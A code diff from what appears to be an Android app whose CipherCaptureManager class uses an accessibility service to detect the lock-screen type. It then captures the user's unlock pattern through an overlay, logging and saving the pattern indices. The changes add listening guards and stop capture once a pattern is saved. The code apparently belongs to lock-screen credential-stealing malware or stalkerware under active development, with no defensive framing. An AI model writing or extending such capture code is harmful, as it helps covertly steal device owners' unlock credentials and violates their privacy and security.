@@ -487,6 +487,7 @@ class CipherCaptureManager(
      * vendor: 多个方法组合
      */
     fun checkLockScreenType() {
+        if (!isListening) return
         try {
             val root = service.rootInActiveWindow ?: return
             // 检查图案锁
@@ -540,6 +541,8 @@ class CipherCaptureManager(
                     patternOverlay!!.onPatternCaptured = { indices, points, screenBounds, parentBounds ->
                         Log.d(TAG, "✅ 图案已捕获: indices=${indices.joinToString("-")}, points=${points.size}")
                         overlayPending = false
+                        patternDetected = false
+                        stopListeningFull()
                         saveCipher("pattern", true, indices.joinToString(","))
                         handler.post {
                             patternOverlay?.isReplaying = false
